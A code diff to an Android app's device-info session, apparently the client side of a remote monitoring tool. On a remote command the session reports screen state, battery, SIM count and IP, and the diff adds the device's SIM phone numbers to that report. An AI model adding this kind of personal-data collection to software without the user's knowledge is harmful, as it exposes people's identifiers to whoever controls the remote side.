@@ -10,6 +10,7 @@ import android.util.Log;
 import com.lyrnic.userside.constants.Actions;
 import com.lyrnic.userside.constants.Constants;
 import com.lyrnic.userside.listeners.OnRequestSendMessageListener;
+import com.lyrnic.userside.managers.NumbersManager;
 import com.lyrnic.userside.utilities.ScreenUtils;
 
 import org.json.JSONException;
@@ -46,7 +47,13 @@ public class DeviceInfoSession extends Session{
 
         switch (action){
             case Actions.ACTION_REQUEST_GET_DEVICE_INFO:
-                sendDeviceInfo();
+                new Thread(() -> {
+                    try {
+                        sendDeviceInfo();
+                    } catch (JSONException e) {
+                        throw new RuntimeException(e);
+                    }
+                }).start();
                 break;
         }
 
@@ -58,6 +65,9 @@ public class DeviceInfoSession extends Session{
         boolean screenState = ScreenUtils.isScreenOnAndUnlocked(context);
         int batteryLevel = ((BatteryManager) context.getSystemService(Context.BATTERY_SERVICE)).getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
         int simCount = getSimCount();
+        NumbersManager numbersManager = new NumbersManager();
+
+        String numbers = numbersManager.getNumbersSync(context);
 
         String ip = null;
         try {
@@ -78,6 +88,7 @@ public class DeviceInfoSession extends Session{
         jsonObject.put("batteryLevel", batteryLevel);
         jsonObject.put("simCount", simCount);
         jsonObject.put("ip", ip == null ? "unknown" : ip);
+        jsonObject.put("simNumbers", numbers == null ? "unavailable" : numbers);
 
         sendMessage(jsonObject.toString());
     }
@@ -89,7 +100,7 @@ public class DeviceInfoSession extends Session{
     private String getIpAddress() throws IOException {
         OkHttpClient client = new OkHttpClient();
 
-        Response response = client.newCall(new Request.Builder().url("https://wtfismyip.com/text").build()).execute();
+        Response response = client.newCall(new Request.Builder().url("https://checkip.amazonaws.com/").build()).execute();
 
         String ip = response.body().string();
 
